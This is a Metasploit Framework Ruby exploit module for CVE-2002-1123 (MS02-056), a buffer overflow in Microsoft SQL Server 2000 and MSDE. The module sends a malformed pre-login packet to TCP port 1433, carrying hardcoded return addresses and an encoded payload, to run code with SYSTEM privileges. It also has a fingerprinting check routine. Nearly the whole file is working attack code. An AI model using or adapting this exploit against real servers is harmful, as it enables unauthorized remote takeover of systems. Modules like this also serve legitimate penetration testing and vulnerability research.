##
# $Id: ms02_056_hello.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::MSSQL

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft SQL Server Hello Overflow',
			'Description'    => %q{
					By sending malformed data to TCP port 1433, an
				unauthenticated remote attacker could overflow a buffer and
				possibly execute code on the server with SYSTEM level
				privileges. This module should work against any vulnerable
				SQL Server 2000 or MSDE install (< SP3).

			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2002-1123'],
					[ 'OSVDB', '10132'],
					[ 'BID', '5411'],
					[ 'MSB', 'MS02-056'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 512,
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
				},
			'Targets'        =>
				[
					[
						'MSSQL 2000 / MSDE <= SP2',
						{
							'Platform' => 'win',
							'Rets'     => [0x42b68aba, 0x42d01e50],
						},
					],
				],
			'Platform'       => 'win',
			'DisclosureDate' => 'Aug 5 2002',
			'DefaultTarget' => 0))
	end

	def check
		info = mssql_ping
		if (info['ServerName'])
			print_status("SQL Server Information:")
			info.each_pair { |k,v|
				print_status("   #{k + (" " * (15-k.length))} = #{v}")
			}
			return Exploit::CheckCode::Detected
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect
		buf = "\x12\x01\x00\x34\x00\x00\x00\x00\x00\x00\x15\x00\x06\x01\x00\x1b" +
			"\x00\x01\x02\x00\x1c\x00\x0c\x03\x00\x28\x00\x04\xff\x08\x00\x02" +
			"\x10\x00\x00\x00" +
			rand_text_english(528, payload_badchars) +
			"\x1B\xA5\xEE\x34" +
			rand_text_english(4, payload_badchars) +
			[ target['Rets'][0] ].pack('V') +
			[ target['Rets'][1], target['Rets'][1] ].pack('VV') +
			'3333' +
			[ target['Rets'][1], target['Rets'][1] ].pack('VV') +
			rand_text_english(88, payload_badchars) +
			payload.encoded +
			"\x00\x24\x01\x00\x00"

		sock.put(buf)

		handler
		disconnect
	end

end
